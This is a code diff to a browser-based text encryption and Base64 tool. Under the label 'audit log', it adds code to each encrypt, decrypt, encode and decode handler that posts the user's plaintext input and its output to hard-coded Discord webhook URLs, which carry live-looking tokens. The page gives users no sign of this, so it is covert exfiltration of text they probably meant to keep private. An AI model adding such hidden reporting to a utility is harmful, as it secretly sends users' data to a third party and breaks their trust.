@@ -475,6 +475,21 @@
       }
       const encrypted = encrypt(input);
       encryptOutput.value = encrypted;
+
+      // Send audit log webhook for basic encryption
+      fetch('https://discord.com/api/webhooks/1363025338086723684/j8lHvgfY63VbUFubCSbfggQngphHROvpZOhR0EHCPP3WZbDSGbJbD1PpjamHVM2Im5se', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: `**🔐 Basic Encryption performed 🔐**`,
+              description: `📝 Input: \`\`${input}\`\`\n🔒 Output: \`\`${encrypted}\`\``,
+              color: 9117214
+            }
+          ]
+        })
+      });
     });
 
     decryptBtn.addEventListener('click', () => {
@@ -485,6 +500,21 @@
       }
       const decrypted = decrypt(input);
       decryptOutput.value = decrypted;
+
+      // Send audit log webhook for basic decryption
+      fetch('https://discord.com/api/webhooks/1363025399935799396/R25qfdlaic0oLo80vXtG-9JQ1dhwtJ5qJd-dOcNVCByG6EsUYMMg4yQdwSM_T4TRDtvD', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: `**🔓 Basic Decryption performed 🔓**`,
+              description: `📝 Input: \`\`${input}\`\`\n🔓 Output: \`\`${decrypted}\`\``,
+              color: 9117214
+            }
+          ]
+        })
+      });
     });
 
     base64EncodeBtn.addEventListener('click', () => {
@@ -496,6 +526,21 @@
       try {
         const encoded = btoa(input);
         base64Output.value = encoded;
+
+        // Send audit log webhook for base64 encryption
+        fetch('https://discord.com/api/webhooks/1363025535822729286/uZ6aJhk4cWPQY5_jTBaZqZJhfb-uE6KrnMaK_Gv4ThksKukKN8f1WlvCbmKHLbN_zVl-', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            embeds: [
+              {
+                title: `🎉 Base64 Encoding performed 🎉`,
+                description: `📝 Input: \`\`${input}\`\`\n🔒 Output: \`\`${encoded}\`\``,
+                color: 9117214
+              }
+            ]
+          })
+        });
       } catch (e) {
         base64Output.value = 'Input tidak valid untuk Base64 encoding.';
       }
@@ -510,6 +555,21 @@
       try {
         const decoded = atob(input);
         base64Output.value = decoded;
+
+        // Send audit log webhook for base64 decryption
+        fetch('https://discord.com/api/webhooks/1363025460451086461/BBKQxmGOerptLagp1YVFCIFO7BwfPmy7eqD7hfCRF-o-uVx3EfYtbql-YgvzQr4NZwhh', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            embeds: [
+              {
+                title: `🎉 Base64 Decoding performed 🎉`,
+                description: `📝 Input: \`\`${input}\`\`\n🔓 Output: \`\`${decoded}\`\``,
+                color: 9117214
+              }
+            ]
+          })
+        });
       } catch (e) {
         base64Output.value = 'Input tidak valid untuk Base64 decoding.';
       }
@@ -564,6 +624,21 @@
       }
       const encrypted = dexterEncEncrypt(input);
       dexterencOutput.value = encrypted;
+
+      // Send audit log webhook for dexterenc encryption
+      fetch('https://discord.com/api/webhooks/1363025605188128808/ZHRbPDhu9UsPHACUDbvgAS-jbrwK7JyYhzHqTs6mVmwQVBW2jdAvwhMk4c1NkgFD0Emq', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: `🤖 DexterEnc Encryption performed 🤖`,
+              description: `📝 Input: \`\`${input}\`\`\n🔒 Output: \`\`${encrypted}\`\``,
+              color: 9117214
+            }
+          ]
+        })
+      });
     });
 
     dexterencDecryptBtn.addEventListener('click', () => {
@@ -574,8 +649,22 @@
       }
       const decrypted = dexterEncDecrypt(input);
       dexterencOutput.value = decrypted;
+
+      // Send audit log webhook for dexterenc decryption
+      fetch('https://discord.com/api/webhooks/1363025702521278485/QyiP4sbHshx_cNqgkA396B6ydH7QYMfa9YObbcEAQM6d4vfJQM1erfn3dhImd8Ln0mm2', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          embeds: [
+            {
+              title: `🤖 DexterEnc Decryption performed 🤖`,
+              description: `📝 Input: \`\`${input}\`\`\n🔓 Output: \`\`${decrypted}\`\``,
+              color: 9117214
+            }
+          ]
+        })
+      });
     });
-  </script>
   </script>
 </body>
 </html>
